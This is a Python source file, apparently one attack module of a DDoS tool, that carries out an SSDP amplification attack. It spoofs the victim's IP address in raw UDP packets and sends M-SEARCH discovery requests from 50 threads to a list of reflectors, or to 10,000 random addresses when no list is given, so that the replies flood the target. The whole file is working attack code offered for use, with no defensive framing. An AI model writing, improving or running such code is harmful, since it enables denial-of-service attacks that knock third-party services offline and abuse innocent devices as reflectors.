#!/usr/bin/env python3
"""
SSDP Amplification Vector
Exploits UPnP SSDP M-SEARCH for ~30x amplification
"""

import socket
import struct
import random
import time
import threading
from typing import Optional, List
from ironcarrier.core.stats import StatsCollector


class Attack:
    """SSDP amplification attack vector"""
    
    SSDP_PAYLOAD = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST:239.255.255.250:1900\r\n"
        "ST:ssdp:all\r\n"
        "MAN:\"ssdp:discover\"\r\n"
        "MX:3\r\n"
        "\r\n"
    ).encode()
    
    def __init__(self, target: str, port: int, duration: int,
                 threads: int = 50, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        
        self.reflectors: List[str] = []
        self.reflector_file = kwargs.get('reflector_file', None)
        self.ssdp_port = kwargs.get('ssdp_port', 1900)
        self._load_reflectors()
    
    def _load_reflectors(self) -> None:
        if self.reflector_file:
            try:
                with open(self.reflector_file, 'r') as f:
                    self.reflectors = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            except FileNotFoundError:
                pass
        
        if not self.reflectors:
            for _ in range(10000):
                ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                self.reflectors.append(ip)
    
    def _build_packet(self) -> bytes:
        reflector = random.choice(self.reflectors)
        
        udp_len = 8 + len(self.SSDP_PAYLOAD)
        udp_header = struct.pack('!HHHH', self.port, self.ssdp_port, udp_len, 0)
        
        total_len = 20 + udp_len
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            0x45, 0, total_len, random.randint(0, 65535), 0x4000, 64, 17, 0,
            socket.inet_aton(self.target), socket.inet_aton(reflector)
        )
        
        return ip_header + udp_header + self.SSDP_PAYLOAD
    
    def _attack_thread(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
        end_time = time.time() + self.duration
        
        while time.time() < end_time and not self.stop_event.is_set():
            try:
                packet = self._build_packet()
                sock.sendto(packet, (random.choice(self.reflectors), self.ssdp_port))
                self.stats.add_packets(1, len(packet))
            except Exception:
                self.stats.add_error()
        sock.close()
    
    def run(self) -> None:
        threads = [threading.Thread(target=self._attack_thread, daemon=True) for _ in range(self.threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.duration + 5)
